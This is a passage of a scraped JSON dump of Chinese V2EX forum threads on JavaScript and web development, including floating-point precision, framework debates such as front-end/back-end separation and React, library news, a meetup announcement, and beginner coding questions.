"注意这个结果已经比原来的小数长了两位（末尾的 11 ），现在要做四舍五入\r", "\r", "0.06 是\r", "1.1110101110000101000111101011100001010001111010111000 * 2^-5\r", "\r", "而\r", "0.060000000000000005 是\r", "1.1110101110000101000111101011100001010001111010111001 * 2^-5\r", "\r", "显然后者的误差更小。\r", "\r", "最后吐槽一下楼主的态度：\r", "实际答案明明是 0.060000000000000005 ，\r", "楼主原帖多了六个 0 ，复制粘贴都不会吗，一定要手打？\r", "\r", "（我一定是知乎玩多了...）", "楼主这被打脸的不清啊。", " 我开始以为之前很多人在 bugs.php.ne 反馈了，然后官方把这个值改了，不过我去 ", " 下载了十多年前的 PHP4.3.11 和 PHP5.0.0 ，发现这个值都是 14 。\r", " 很奇怪为什么你那个例子在不改 precision 的情况下能复现。", "IEEE 754···", " 设置 precision 影响显示的值的位数（整数部分和小数点部分），但是开始和结尾部分的 0 不算数。\r", "<?php\r", "$num = 0.012345600000000000;\r", "ini_set(\"precision\", \"12\");\r", "echo $num; // 0.0123456\r", "echo \"\\n\";\r", "ini_set(\"precision\", \"3\");\r", "echo $num; // 0.0123\r", "echo \"\\n\";\r", "ini_set(\"precision\", \"5\");\r", "echo $num; // 0.012346\r", "echo \"\\n\";\r", "?>", " 顺便说一句，如果有人要开发一套类似于支付宝的系统（或者 V2EX 的货币系统），那货币的金额一定要是 “ 1 分钱” 的整数倍，而不是有 “ 0.01 元” 这样的数据。所有的数据都要用整型表示，显示的时候再加上小数点，否则时间长了算账的时候会疯掉的。\r", "\r", "举个例子，消失的一元钱：\r", "\r", ">>> 9999999999999999.0 + 1 - 9999999999999999\r", "0.0", " 什么叫被大脸？？？？\r", "他不是在好好的问问题吗？？？？", " ", " 我前面的回复有提到鸟哥这篇文章的 url 。", " 何不用定点数  decimal BigDecimal", "「你看似有穷的小数, 在计算机的二进制表示里却是无穷的」\r", "---from ", "相当一部分语言算不好 0.1+0.2-0.3 我记得", "LZ 大一？", " 你数一下 0 的个数大概就不能指望是 IEEE-754 的双精度了，起码是扩展双精度。\r", " PHP 还真有相关的 bug ，而且曾经造成了比较严重的后果，不过具体表现和系统相关： ", " 双精度是说 JS 用 64 位 IEEE754 存储浮点数", "这个跟语言什么关系？", " 我做的微信商城的确是这样设计的", " 最后的结果看着好像卖萌", "JavaScript : 怪我咯？", "c#的 decimal 和 Java 的 BigDecimal 之所以没有出现精度差异，只是因为在其内部作了相应处理，把这种精度差异给屏蔽掉了，\r", "\r", "javascript   decimal.js   big.js\r", "\r", "\r", "\r", "\r", "－勤于思，敏于行。"]},
{"content": ["<div class=\"topic_content\"><img src=\"http://ww3.sinaimg.cn/mw690/006iZdgkgw1f6hi2kobd0j30e8080ta1.jpg\" class=\"embedded_image\" border=\"0\"> \r<br>懂得直接加我 QQ;85172225 价格可以谈</div>"], "reply": "1", "tittle": "有偿求够一个 JS 版的 baccarat road 算法 包括 big road（大路） bigeye road（大眼路） small road（小路） cockroach road（螳螂路）", "comment": ["百家乐原来这么上流"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>JS 是最流行的程序设计语言之一。以下这些和它有关的工具书，大家有没有看过呢？</p>\n<p>适合初学者：\nA Smarter Way to Learn JavaScript: The new approach that uses technology to cut your effort in half\nJavaScript: The Ultimate Beginner's Guide\nJavaScript: A Beginner's Guide to Learning the Basics of Javascript Programming!</p>\n<p>适合中级水平：\nJavaScript and JQuery: Interactive Front-End Web Development\nThe Principles of Object-Oriented JavaScript\nNode.js Design Patterns</p>\n<p>适合高级水平：\nYou Don't Know JS: Scope and Closures\nProfessional JavaScript for Web Developers\nPractical Node.js: Building Real-World Scalable Web Apps</p>\n<p>每本书的详细资料请浏览：\n<a href=\"https://www.livecoding.tv/categories/javascript/history/\" rel=\"nofollow\">https://www.livecoding.tv/categories/javascript/history/</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "分享英文版的 JS 编程设计丛书", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前后端以及 UI 分离的好处：</p>\n<ol>\n<li>后端相当好测试</li>\n<li>后端还可以服务多个平台，比如 APP ， WEB 等</li>\n<li>前端还可以用于多个平台，比如 APP ， WEB 等</li>\n<li>耦合度低，自己和别人协同开发相当轻松， UI 写 css, 前端写逻辑和 component ，后端写和数据库的交互</li>\n<li>耦合度低，自己和自己协同开发也相当轻松。</li>\n<li>用模板引擎来生成 html 太痛苦。</li>\n<li>前端技术带来的 UX 提升是相当重要的！而这些使用传统的后端生成 html 方式很难实现。比如表单验证， inline editing 等。</li>\n</ol>\n<p>/t/298014 这里有一个很大的问题：</p>\n<p>前后端分离是一种技术，跟招聘没有任何关系。</p>\n<p><strong>全栈工程师也应该采用前后端分离的开发方式。 UI 交给专门的 UI</strong></p>\n<p>前端都不会还好意思说全栈？</p>\n<p>别说小公司，个人项目都应该采用前后端分离</p>\n</div></div>"], "reply": "48", "tittle": "我为什么赞成前后端以及 UI 分离", "comment": ["主流思想就没必要强调了。铜币送上", " 我就是不懂为什么那个帖子说前后端分离就等于招两个人", "前后端分离跟招 2 个人的关系是什么鬼，为什么会得出这个结论？", " 原贴的结论", " 中过专家特色的结论~", "哎，你跟小朋友一般见识啥的", "撇开业务谈技术架构都是耍流氓", "上一个 喷前端新框架、喷前端被带歪 喷得那么厉害的人叫 [ 某当老师 ] ", "这才是正确的打开方式，硬币奉上~", "似乎没提到，分离后前端可以独立迭代上线。。", "UI 交给 UI 设计师是对的 美术生的功底可不是程序员想学就学的来的", "我也赞成要严格分离，不过说原楼主小朋友就不合适了，他回复里面讲了阿里的早期项目他也参加过，至少工作经验已经在那里了", "没吃过螃蟹的人 永远都不知道螃蟹有多好吃 铜币双手捧上~", "保守派一直都会在", "跟小朋友讨论大人的事情，总会有种不知从何说起的无力感。所以啊，教小孩有时候就是不能解释为什么，让他自己去经历和感受就好了。", "自己一个人开发，分离相当爽，需要什么接口马上写…", "前后端分离的和不分离的我都做过，但是我自己明显喜欢分离的", "这样的讨论其实对前端的发展是有好处的, 我是赞成大部分的网站规模根本不需要 React 的", "。。。奇葩了。\r", "我感觉你们和看得不是同一篇文章。\r", "\r", "\r", "原文中有句话: \"总之我不认同这种前后端分离。\"\r", "\r", "我概括能力有限，作者这里针对的是某种\"前后端分离\".\r", "\r", "结合他回复来看，他并不是完全否定它，不同场合还是有需要的。他提到了一些交互性高的项目。也有人评论说项目大了也要。\r", "\r", "我觉得他更想说的是，\"大多数网站没有必要上越来越复杂的前端框架， jquery 之类的就够了。\"", "看到这帖子的回复有点失望。", "虽然我同意前后端在一定条件下是需要分离的\r", "\r", "但你这个帖子完全没喷到点上……", "关键是靠谱的前端少，你让前端写逻辑， 10 个里面 9 个趴下，另外 1 个你养不起。", "公司目前不仅在做前后端分离，还正准备部署 cnpm 管理前端组件，规模不同，各取所需即可，抛开规模和工程的话没什么太大意思，本来就各有优劣。", "技术问题的讨论大家就事论事，讲道理遵从逻辑就好，很多问题并不是非黑即白的。\r", "这帖子后面某些回复 low 而不自知。", "我过来围观。", "隔壁贴居然有傻 x 在喷 前端写的代码, 用的工作流、工具链连后端都看不懂, 从而证实前端都是在装 X 。", "说了这么多，你们都用什么前端框架啊", "大概 10 年前，几乎所有的技术博客都在谈论缓存、分布式，包括个人博客，使用缓存、分布式之类的技术，都要拿出来分(炫)享(耀)\r", "\r", "哦，对了，还有 asp 圈的生成真静态。", "说了这么多，你们都是怎么分离的啊", "我感觉楼上那些个人写项目都要前后端分离的，跟 10 年前个人博客(自己开发哦)都要使用缓存技术是一丘之貉：痛并快乐着", "撇开业务谈技术架构都是耍流氓 + 1", " 然而使用缓存是自然而然的事情。比如生成 token 防重放的地方，存到 memcached （或 redis ）里面相当方便。再比如短信验证码功能，存缓存里也相当方便。", "我从来就没反对过前后端分离。我反对的是一些鼓吹框架的观点，使得开发者牺牲了学习成本和迁移成本，却没有得到相应的效率。比如 ng1 就做的很差，基本上是全手动，也就是使用 for 标签插入表格的时候比 jq 好点。定位控件还要用一个 scope 和一个 name ，比 jq 的一个 selector 还要麻烦。所以我说它就是个模板引擎。\r", "\r", "当然 ng2 改良了很多，全变成了组件， html 里也看不到模板的影子了。但是跟 ng1 完全就是两个东西，想要迁移还需要费点精力。", " 因为那时候缓存、分布式都是新鲜技术，个人博客使用你觉得是装逼是炫技，而现在这些技术已经成了基础设施，成了云平台或者 Web 框架就默认提供的东西。你能想象现在的网站完全不用缓存不用分布式技术的吗\r", "\r", "要你这么说（或者 ", " 里的观点），那十年前的雅虎前端优化 14 条军规， Gmail 的 Ajax 都是大公司迷信，都是瞎折腾，都是不适合个人开发者或者小公司的。而你现在再来看呢？", "好好好", " \r", "\r", "“ 256K 内存对任何人都够了”、“世界上只需要 5 台电脑就够了（这句话也许未来可能成为现实，但那还能叫<电脑>吗）” \r", "\r", "对于这样看新技术的前端，我觉得就用一辈子 IE 6 +  jQuery 1.x 就够了", "用 jquery+html+css 一样能前后端分离\r", "用框架反倒是为了降低团队协作的难度", " 其实如果有 C/S 开发的经验，那么前后端分离看起来会更加自然", "诶，还停留在这种级别的争论，人家都去火星了\r", "\r", "另外那篇帖子的 lz 号称自己是腾讯出来的，基本解释了为什么腾讯这样体量的公司虽然体积是 facebook 级别，但是对技术其实没有什么贡献，靠得还是人海战术", "我站这边", "话说天下大势，合久必分，分久必合……", "矣,我只是想在个人项目里练一下手啊,团队项目必然有许多考量和约束哪能说用就用，光做 demo 又只见其型．\r", "好不容易在个人项目里用可以自由的些新一点的技术还要被劈头盖脸一顿\r", "‘这么简单懂项目用个卵的框架，分个卵的前后端，老老实实 php+jq 懂不懂？‘\r", "╮(╯▽╰)╭", " 但是的却有这个问题，技术越用越新，体验越来越差(典型的新浪微博，每次改版都被骂)，这不是搞技术的悲哀么，再牛的技术再好的构架死在脑残的产品经理手上", "用全栈 Rails 必然要给 Rails 的思路背书啦，铜币奉上。", " 腾讯都是实用主义的工程师，已解决问题为中心，不瞎搞", "我逛 V 站时间不长，但是最近觉得一种现象越来越常见：\r", "\r", "两个人开两个帖隔空争论，他们都在自己的安全区里侃侃而谈但很少去对方的帖子直接对嘴，发泄一通后心满意足地走了，留下看客一地的瓜子。", " 好文采", "前后端在架构设计上是需要分离着去思考的。\r", "但是实际操作需要看情况的。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原网站挂了，在此存档。</p>\n<p>ReactJS is a tax Facebook levies on startup web development.</p>\n<p><a href=\"https://typed.pw/a/1322\" rel=\"nofollow\">https://typed.pw/a/1322</a></p>\n<p><a href=\"https://www.reddit.com/r/reactjs/comments/4vyo0l/reactjs_is_a_tax_facebook_levies_on_startup_web/\" rel=\"nofollow\">https://www.reddit.com/r/reactjs/comments/4vyo0l/reactjs_is_a_tax_facebook_levies_on_startup_web/</a></p>\n<p>Although initially I was very excited about React, after working on several teams doing React-based web development I ’ ve found the overall amount of effort spent developing web applications is significantly more than vanilla HTML/CSS/JS.</p>\n<p>We reached the point where our people spend more time (and code) tricking the framework into doing what we want it to do.</p>\n<p>Also performance is abysmal.</p>\n<p>The component philosophy of React does offer some organizational benefits, especially for working in a team, but it ’ s nothing that couldn ’ t be replicated by some simple coding conventions.</p>\n<p>Facebook - as a company that can ’ t really move fast anymore (and doesn ’ t have to) - knows this imposes the same restriction on smaller companies by taking away their agility and maxing out developer resources for work on what used to be trivial stuff. From Facebook ’ s perspective, React has to serve two functions:</p>\n<p>priming and funnelling programmers into their enterprise and</p>\n<p>suppressing development efficiency elsewhere.</p>\n<p>It ’ s positioned very well to achieve both.</p>\n<p>Don ’ t get me wrong, I think it ’ s perfectly well designed to suit Facebook ’ s internal needs while at the same time it ’ s guaranteed to drain resources from startup developers. Intent is not necessary, it ’ s just what happened.</p>\n<p>If other shops felt the same way you did about React … about the folly of developing apps with “ vanilla HTML/CSS/JS ” that you don ’ t …</p>\n<p>I ’ m fairly confident that almost nobody shares this opinion, so personal attacks on my competency are expected, yes.</p>\n<p>The problem with all tech fads is that support for them is absolutely ardent, until the pendulum swings in the other direction.</p>\n</div></div>", "<div class=\"topic_content\"><a target=\"_blank\" href=\"https://www.zhihu.com/question/49297106\" rel=\"nofollow\">https://www.zhihu.com/question/49297106</a>\r<br>如何看待 React is a tax Facebook levies on startup 的说法？</div>"], "reply": "34", "tittle": "初创公司使用 ReactJS 就是在向 Facebook 交税", "comment": ["我主要担心它不长久，而且设计思想太跳跃，的确有太多实验性质。", "React 是一个很好的工具，那么为什么不用好工具。是给自己的愚昧交税？", "人做的不好总喜欢把责任赖在工具上", " 9494", "@真阿当", " 嗯呐，愚昧税，初创乱选框架，以后欠一屁股债。", "这就是对国外大公司的技术迷信,　 Facebook 的东西就一定好吗？　 Google 的东西就一定高大上吗？\r", "\r", "AngularJS 、 Backbone 、 Ember 、 React 则完全使用另外一种开发模型，框架不只是库的简单集合，它还有自己的事件、 DOM 交互模型。\r", "\r", "最关键的一点这些些框架把你框住了，用了就不能换。甚至连 ng1 和 ng2 都不兼容。\r", "\r", "讲一个真实的例子，某知名创业公司：开始于 backbone 流行时，就用 backbone 写了，后来 angularjs 出来了，就用 ng1 重写了，再后来 ng2 出来了，又在用 typescript 重写中。累不累呀？\r", "\r", "早期的 Prototyp/jQuery 只是一些库，基本做事方式还是 html+css+js 。 web 开发的本质并没有变，现代 JavaScript(ES6)的新标准对 jQuery 有着许多借鉴，例如类选择器， DOM 操作等。当你用上这些高层框架，你就会发现离本底 web 开发越来越远，开发越来越复杂。网页加载越来越慢，你也越来越累。\r", "\r", "\r", "个人比较喜欢类 library 一类的库比如 jQuery ， zepto ，这些东西是可以在不重写应用的情况下替换掉，感觉很爽。", " 他们的前端就是这么闲。", " ES6 借鉴了类 JS 语言， Dom API 借鉴了 jQ 。", "框架就是为了让你减少复杂度和维护的难度，当然是针对大项目而言。", "要看项目的环境……不要盲目迷信。\r", "一般我自己单人做移动端项目，都是用原生的 JS 比较多，\r", "做到多人的项目，用上框架，就等于默认的定制了开发的标准，这个有什么不好", "人蠢就喜欢怪工具", "觉得框架不能满足需求 可以 fork 了改阿 React 只是一个 UI 的框架，已经很轻量了", " 不算轻了", "肯定要分情况，不是所有项目都适合 React ， 也不是创业公司就不适合 React 。 感觉今天楼主观点一直比较极端， 其实没必要纠结这些问题，拿合适的工具做合适的事， 具体项目具体去权衡！ 看楼主也是前端老鸟了，难不成楼主是单身，故意七夕引战？", " 稍微复杂一点的应用你就要用上 redux 、 router ...等一系列全家桶", " 23333", " 我只是存档，这网站挂了", "人员太水还是用 jquery 吧…", " 社区用的多但并不是一定要用，担心要给 fb 交税的话可以自己实现自己的方案，又不复杂。", "从不懂前端的角度来探讨：\r", "不付出哪里有回报\r", "刚好不会前端，从这里上手也挺不错的\r", "至今为止还不能很好分辨流行的几个框架的区别。。。\r", "不过 react 对个人来说最好上手，使用 react native 还能最快地建立一个热更新原生应用\r", "万一 react 真黄了的那个时候背后也冒出一堆代替方案了，再不济也会了一点原生应用的编写模式 可以改行\r", "等 ES 新标准出来后这些可能都会变为时代的眼泪\r", "\r", "PS:国外貌似也很流行的 Ember.js ，可惜圈子太小基本没见到有人讨论。。", "这你们就不懂了吧，前端人员弄出这些框架，就是为了让他们做的东西显得高大上，只有 html 和 css 工资哪来能高？\r", "FB Google 这些公司有的是闲钱来招聘这些前端人员，弄出个新的框架，不仅这些人的牌坊有了，顺便还帮公司立一个牌坊", "自己写个 virtual-dom 呗 又不难", " 用 DOM 为什么要用 Virtual DOM ？", "给你编一个汽车阴谋论\r", "\r", "骑马多环保啊，那些发明生产汽车的都是想害人，那些工程师现在把车做得又漂亮又舒适，还不是为了自己赚钱？每年几十万人死于车祸啊，被马撞死的几个？你需要那么快去别的地方吗？人类走路骑马几千年了都没问题。现在又搞电动车，其实汽油柴油就够了，马斯克不这么搞他能融到资？\r", "\r", "只要你坐车就上当啦，啦啦啦", "不然呢？老板雇你来不就是让你熟悉各种框架，好好研究，强身健体，然后跳槽好 double 么？ 0.0", "反正我觉得楼主水经验的姿势水平很高 233", " 从不签到，一缺铜币我就发帖。", " 他喷人，我只喷技术。", "startup ？有牛人不？牛人有时间去处理这种基础框架的问题不？如果没有，那么老老实实填个久经考验的东西做东西是最安全的，为什么大公司搞这种东西完全 OK ？他们有雄厚的人力财力来掌控代码(比如 Google 把 webkit fork 回去，需要添加功能自己开发，后来直接改名就 blink)，小公司起步阶段大多没有这种实力，不务实怪 Facebook 咯。", "刚才看了下 github ，有人知道为什么 react 的版本号从 0.14 一下子到了 15 ?", " 任性，故意的。", " ", "初创公司能用 ReactJs ，那最好， P 三端平移成本低。\r", "不会也没关系， jQuery 工具库， vuejs 先用着。业务验证，有用户有融资，再换技术栈也不迟。\r", "\r", "用户数少于 10W+的用这种新技术体现不了什么价值。\r", "\r", "总之，技术为业务服务并提供支持，什么阶段配什么技术。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.livecoding.tv/anthonygore/videos/PrjE6-odin-project-3-build-snake-game-wjquery-2\" rel=\"nofollow\">https://www.livecoding.tv/anthonygore/videos/PrjE6-odin-project-3-build-snake-game-wjquery-2</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "分享一个使用 JS 开发的游戏软件－ Snake", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>Vue 2.0 RC1 发布</h2>\n<p><img alt=\"图片描述\" src=\"https://segmentfault.com/img/bVAqQ0\"></p>\n<p>Vue 在四月份的时候已经公布了 2.0 ，最近 Vue 发布了 2.0 的第一个 RC 版本，也就是说从 RC1 到正式版发布， API 已经不再会有大的变动了，喜欢尝鲜的朋友已经可以去试试了。</p>\n<p>链接：<a href=\"https://medium.com/the-vue-point/the-state-of-vue-1655e10a340a\" rel=\"nofollow\">https://medium.com/the-vue-point/the-state-of-vue-1655e10a340a</a></p>\n<h2>PyMiniRacer</h2>\n<p><img alt=\"图片描述\" src=\"https://segmentfault.com/img/bVAqQ2\"></p>\n<p>这是一个 Python 项目，嵌入式的 V8 引擎，能运行 JavaScript 代码，与此前的 pyv8 做着同样的事，这个轮子又有什么优势呢？有兴趣的可以去探究一下。</p>\n<p>项目地址：<a href=\"https://github.com/sqreen/PyMiniRacer\" rel=\"nofollow\">https://github.com/sqreen/PyMiniRacer</a></p>\n<h2>baffle.js</h2>\n<p>这是一个实现文字效果的库，使文字变成乱码然后逐渐恢复，实际感受还得自行体会。</p>\n<p><img alt=\"图片描述\" src=\"https://segmentfault.com/img/bVAqRa\"></p>\n<p>官网：<a href=\"https://camwiegert.github.io/baffle\" rel=\"nofollow\">https://camwiegert.github.io/baffle</a></p>\n<h2>js-joda</h2>\n<p>js-joda 是一个提供不可变 Date 和 Time 类型的库。不可变的数据类型(Immutable)一直是函数式编程必备， Facebook 虽然提供了 ImmutableJS ，但是只有集合类型，如 Set 、 Map 、 List 等，如果你需要到不可变的 Date 和 Time ，那 js-joda 也是一个不错的选择。</p>\n<p>项目地址：<a href=\"https://github.com/js-joda/js-joda\" rel=\"nofollow\">https://github.com/js-joda/js-joda</a></p>\n<h2>Typr.js</h2>\n<p>一个用于处理字体（ TTF 、 OTF ）的库，是一个 opentype.js 的替代方案，声称解析速度比 opentype.js 快 2 到 5 倍，但体积却小了 4 倍！</p>\n<p>项目地址：<a href=\"https://github.com/photopea/Typr.js\" rel=\"nofollow\">https://github.com/photopea/Typr.js</a></p>\n<h2>lightgallery.js</h2>\n<p>顾名思义，一个模块化的图片轮播、相册画廊的轻量级 js 库，无依赖、功能齐全、响应式的，还支持 HTML5 视频。</p>\n<p><img alt=\"图片描述\" src=\"https://segmentfault.com/img/bVAqRd\"></p>\n<p>官网：<a href=\"https://sachinchoolur.github.io/lightgallery.js/\" rel=\"nofollow\">https://sachinchoolur.github.io/lightgallery.js/</a></p>\n<h2>react-media</h2>\n<p>一个让 React 支持 CSS 媒体查询(media query)的组件，用法比较简单：</p>\n<pre><code>\timport React from 'react'\n\timport Media from 'react-media'\n\t\n\tclass App extends React.Component {\n\t  render() {\n\t    return (\n\t      &lt;div&gt;\n\t        &lt;Media query=\"(max-width: 599px)\"&gt;\n\t          {matches =&gt; matches ? (\n\t            &lt;p&gt;The document is less than 600px wide.&lt;/p&gt;\n\t          ) : (\n\t            &lt;p&gt;The document is at least 600px wide.&lt;/p&gt;\n\t          )}\n\t        &lt;/Media&gt;\n\t      &lt;/div&gt;\n\t    )\n\t  }\n\t}\n</code></pre>\n<p>项目地址：<a href=\"https://github.com/ReactTraining/react-media\" rel=\"nofollow\">https://github.com/ReactTraining/react-media</a></p>\n<h2>dn2a-javascript</h2>\n<p>一个 dn2a （ Digital Neural Network Architecture\n：数字神经网络架构）的 javascript 实现，这货分明是一个跟人工智能的有关的东西，有兴趣的同学可以研究研究。</p>\n<p>项目地址：<a href=\"https://github.com/dn2a/dn2a-javascript\" rel=\"nofollow\">https://github.com/dn2a/dn2a-javascript</a></p>\n<h2>Mister-Poster</h2>\n<p><img alt=\"clipboard.png\" src=\"https://segmentfault.com/img/bVAqRo\"></p>\n<p>一个用 React Native 、 Redux 和 Firebase 做出来的移动端 App 。\n项目地址：<a href=\"https://github.com/shoumma/Mister-Poster\" rel=\"nofollow\">https://github.com/shoumma/Mister-Poster</a></p>\n<p>原文链接： <a href=\"http://t.cn/RtjikDk\" rel=\"nofollow\">http://t.cn/RtjikDk</a></p>\n<p>微信号：程序员晋级之路『 code-learning 』</p>\n<p><img alt=\"clipboard.png\" src=\"https://segmentfault.com/img/bVAqVW\"></p>\n</div></div>"], "reply": "7", "tittle": "JavaScript 新鲜事·第 4 期", "comment": ["mark 了!", "3q", "文字效果好棒！", "看了楼主发的几篇帖子，已 block", "虽然是广告，可内容不错 已关注", "mark ！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>What is Node Party?</h1>\n<p>每月组织 JavaScript/Node 开发者聚会，关注热门的前端、后端框架，开发工具和方法。</p>\n<p>＊ 学习新东西\n＊ 认识新朋友\n＊ 聚餐</p>\n<p>我们会为你准备：\n咖啡，甜点，红酒，爆米花和动听的音乐，一起度过一个愉快的下午。</p>\n<h1>时间</h1>\n<p>8 月 21 日 星期日 下午 13:00 ～ 17:30</p>\n<h1>地点</h1>\n<p>科技寺创业空间(三里屯店)</p>\n<p>地址: 朝阳区南三里屯路北京机电院 10 号楼 2 层凯富大厦正南</p>\n<h1>内容</h1>\n<h2>13:00 ~ 13:30 入场</h2>\n<h2>13:30 - 14:30 AMP-API 管理平台 - 骆也 美信 /前端研发部</h2>\n<p>骆也。前端人，处女座。网名，灵魂腹肌猫，努力做名合格的 coder 。</p>\n<p>Github - <a href=\"http://github.com/luoye-fe\" rel=\"nofollow\">github.com/luoye-fe</a>\n大纲</p>\n<p>AMP-API 管理平台\n1.1 项目来历: API 管理困难</p>\n<p>1.2 设计 API 服务管理工具</p>\n<p>1.3 Mock Server: 定义和开发分离。</p>\n<p>2.1 Koa2: 便捷的控制异步流程</p>\n<p>2.2 Mongodb: 前后端统一数据结构</p>\n<p>2.3 Vue:  完整的生态，完善的工具链</p>\n<p>2.5 Webpack: 自动化构建</p>\n<p>2.6 Babel: 无所忌惮 使用 JavaScript 新特性</p>\n<p>3.1 Vue-cli: 项目一键生成</p>\n<p>3.2 后台管理应用的一些经验</p>\n<p>3.3 走向开源: 代码梳理， 交互体验</p>\n<h2>14:50 - 15:50 Threejs 从入门到不放弃 - 苏博  汽车之家</h2>\n<p>前端开发工程师, 一腔热血的激情 / 一夜失眠的创意 / 一丝细节的执着。</p>\n<p>Github - <a href=\"http://github.com/boblank\" rel=\"nofollow\">github.com/boblank</a>\n大纲\nThreejs 从入门到不放弃</p>\n<p>1 Why Threejs?</p>\n<p>2 Getting started</p>\n<p>2.1 Threejs Doc</p>\n<p>2.2 WebGL</p>\n<p>2.3 Math</p>\n<p>3 Intro to Threejs</p>\n<p>4 Demo</p>\n<p>4.1 Basic Demo</p>\n<p>4.2 全景图 Like 720Yun</p>\n<h2>16:10 - 17:30 Barcamp</h2>\n<p>每个人介绍一下自己</p>\n<p>简单介绍，公司，工作，兴趣，擅长的技术栈</p>\n<h2>结束后</h2>\n<p>晚上有空的，在附近一起吃饭。</p>\n<h1>往期回顾</h1>\n<p>照片， PPT ， Slides <a href=\"https://github.com/rockq-org/node-party\" rel=\"nofollow\">https://github.com/rockq-org/node-party</a></p>\n<h1>报名地址</h1>\n<p><a href=\"http://www.bagevent.com/event/170686\" rel=\"nofollow\">http://www.bagevent.com/event/170686</a></p>\n</div></div>"], "reply": "1", "tittle": "NodeParty 第十五期 #1 API 管理平台 #2 Threejs 实践", "comment": ["请问最近还有吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>由于业务逻辑需要，要用户在点击下载链接后，出现 5 秒倒计时，然后本页面上出现下载地址。由于对 javascript 不太熟悉，求实现代码。</p>\n<p>有点类似于这个问题，但是我不是要直接下载文件，而是出现下载地址。\n<a href=\"https://segmentfault.com/q/1010000006082435\" rel=\"nofollow\">https://segmentfault.com/q/1010000006082435</a></p>\n</div></div>"], "reply": "17", "tittle": "求请教代码：点击某个链接， 5 秒后在本页面上出现隐藏的内容（下载地址）", "comment": ["setTimeout()和 setInterval() 结合使用", "<div style=“ display: none ”>下载链接</div>\r", "\r", "然后 js ： setTimeout()将那个 div 的 display 改成 block", "1. 倒计时功能要写个 setInterval ，每秒触发一次， 5 秒后清除掉。\r", "2. 写个函数 fn ，实现显示下载地址的功能，然后这样调用： setTimeout(fn, 5000)", "。。。。。为什么我看到这个问题的第一反应是怎么防止前段看代码直接抓数据。。。", "  = =同这么想", "伸手党在这里是会被骂的", " 是请教大家，不算申手直接拿，我也在 V2EX 中回答过许多问题。术业有专攻，入门要人指点带路。", " 我认为“求实现代码。” 是直接叫人帮你写的意思", "为什么我第一时间想到了 1024 上经常用到的图床……", "如果是为了防抓取，还要加上 ajax 读取下载地址，现在 1024 有一个图床特闹人，同样的 url 直接访问可以看到图片，一旦下载就变成了小图片，还没开始研究怎么跳过去", "这方面你可以请教一下 yunfile 这个网盘", "~~~\r", "[5,4,3,2,1,0].forEach((i) => {\r", "  setTimeout((i) => {\r", "    if(i === 0) {\r", "      ajax.getDownloadUrl().then((url) => {\r", "        yourButton.href = url;\r", "        yourButton.removeAttr('disabled');\r", "      })\r", "    } else {\r", "      yourButton.innerHTML = `倒数:${i}`;\r", "    }\r", "  }), 1000*(5 - i));\r", "});\r", "~~~\r", "\r", "大概是这样吧……不保证能运行哟", " 你这代码楼主肯定跑不起来。。。", "只是显示隐藏内容不还倒数就没意义了吧。\r", "肯定是延时向服务器请求下载链接。然后显示在指定位置", " 感谢指导！", " 确实就是那样的需求"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用 autoprefixer 处理 css 是遇到一个问题。</p>\n<p>这是部分 webpack.config.js</p>\n<p><img alt=\"\" src=\"https://segmentfault.com/img/bVBUFr\">\n<img alt=\"\" src=\"https://segmentfault.com/img/bVBUl8\"></p>\n<p>这是生成的 css</p>\n<p><img alt=\"\" src=\"https://segmentfault.com/img/bVBUHu\"></p>\n<p>现在把注释去掉 不去压缩 生成的 css 代码变成这样了</p>\n<p><img alt=\"\" src=\"https://segmentfault.com/img/bVBUmp\"></p>\n<p>这是为什么？？求解</p>\n</div></div>"], "reply": "1", "tittle": "webpack 生产模式下压缩问题", "comment": ["市场占有率较低的被忽略了？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有没有团队的线上项目是用的 babel 编译的呢?</p>\n<p>因为最近的一个项目用到了一些新的特性包括 ES7 的 async await 等, 但是没有充分的数据可以证明 babel 编译出来的代码对所有机型的兼容性.所以还不敢上线.</p>\n</div></div>"], "reply": "9", "tittle": "babel 在线上浏览器环境的应用", "comment": ["我们用，低版本浏览器需要上一些 polyfill 。不过 async await 还没进 ES7 还是稳妥点好。\r", "\r", "如果要兼容 IE 可能需要注意一些： ", "对所有 ES5 兼容的浏览器都是兼容的 IE > 8", " ES7 早发布了， async/await 很有可能在 ES2017", " async/await 已经 stage-4 了，也就是说已经进入了  ES2017", " \r", " 对啊，所以说并不是一个 ES7 特性。不过这个特性确实挺甜的。", "编译成 Promise ，主流浏览器都支持了。", "今天测试了 20+主流安卓机, 跑起来都挺正常的. 准备上线观察一下.", " 你们是什么页务呢, 然后 PV 多少?", "用用 es2015+co 体验也差不多吧……有必要上 await 吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原文：<a href=\"http://iwritejs.com/complex-front-end/\" rel=\"nofollow\">http://iwritejs.com/complex-front-end/</a></p>\n<p>纯属吐槽文，不服来辩。</p>\n<hr>\n<p>不知道什么时候开始，前端开发已经到了不开一个 watcher 就无法工作的地步了。不依赖 Gulp 、 Babel 、 WebPack ，还能优雅地写代码吗？</p>\n<p>那我就带你来回顾一下这一切是怎么发生的。</p>\n<p>从哪开始说好呢？我们就从『前端打包』开始吧。</p>\n<h2>前端打包</h2>\n<p>很久以前（也就五年左右吧，但是五年前端已经大变样了），页面的 JS 压缩（混淆）一般是用谷歌的 closure compiler 做的。但是突然蹦出来个 Node.js ，前端开发者们就开始第一次小试牛刀了，用 Node.js 来做 JS 压缩，一般都是用 <a href=\"https://www.npmjs.com/package/uglify-js\" rel=\"nofollow\">uglify-js</a> 来做。</p>\n<p>JS 压缩做了， CSS 压缩是不是也可以做？ JS lint 是不是也可以做？自动测试是不是也可以做？文件合并是不是也可以做？</p>\n<p>于是 grunt 应运而生，它可以帮你把这些事情都做了，只需要配置一个简单的 Gruntfile 即可。</p>\n<p>同一时期， AMD 和 CommonJS 也出现了， Node.js 用 CommonJS 加载模块，浏览器用 AMD 